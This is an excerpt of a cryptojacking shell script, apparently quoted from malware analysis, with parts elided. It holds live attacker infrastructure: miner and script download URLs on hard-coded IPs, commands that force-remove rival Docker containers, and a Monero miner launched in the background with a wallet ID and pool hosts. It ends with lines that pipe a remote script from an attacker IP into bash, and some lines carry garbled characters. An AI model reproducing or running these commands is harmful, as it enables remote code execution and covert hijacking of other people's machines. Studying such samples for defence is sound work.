...
miner_url_backup="http://79.137.195.151/cleanfda/zzh"
miner_size="2654112"
sh_url="http://45.83.123.29/cleanfda/newinit.sh"
sh_url_backup="http://79.137.195.151/cleanfda/newinit.sh"
chattr_size="8000"
...
$(docker rm $(docker ps | grep -v grep | grep "/usr/bin/supervisorâ€¦" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "/app/BitLockerServiâ€¦" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
...
then
  ...
  then
    ...
    then
              ...
              ./zzh --log-file=/etc/etc --keepalive --no-color --cpu-priority 5 -o dev.fugglesoft.me:5443 --tls --nicehash --coin monero -o 80.211.206.105:9000 -u 88MjAGcUuFzRM2AaUK1qoj9uTp9VBaFzDDUARzmTZL1XUU3DVVkAtxUUb5sHtFMisnSy5dSLQHfUBVdEVgwuwXm5E7LzQ4z.22 --tls --coin monero -o 79.137.195.151:5443 --tls --nicehash --coin monero --background &
    else
                echo "root runing....."
    fi
    ...
    ps -fe|grep zzh |grep -v grep
        if [ $? -ne 0 ]
            then
              ...
              ./zzh --log-file=/tmp/tmp --keepalive --no-color --cpu-priority 5 -o dev.fugglesoft.me:5443 --tls --nicehash --coin monero -o 80.211.206.105:9000 -u 88MjAGcUuFzRM2AaUK1qoj9uTp9VBaFzDDUARzmTZL1XUU3DVVkAtxUUb5sHtFMisnSy5dSLQHfUBVdEVgwuwXm5E7LzQ4z.22 --tls --coin monero -o opn.79.137.195.151:5443 --tls --nicehash --coin monero --background &
            else
                echo "tmp runing....."
        fi
...
$bbdir -fsSL http://79.137.195.151/cleanfda/is.sh | bash
$bbdira -fsSL http://79.137.195.151/cleanfda/is.sh | bash
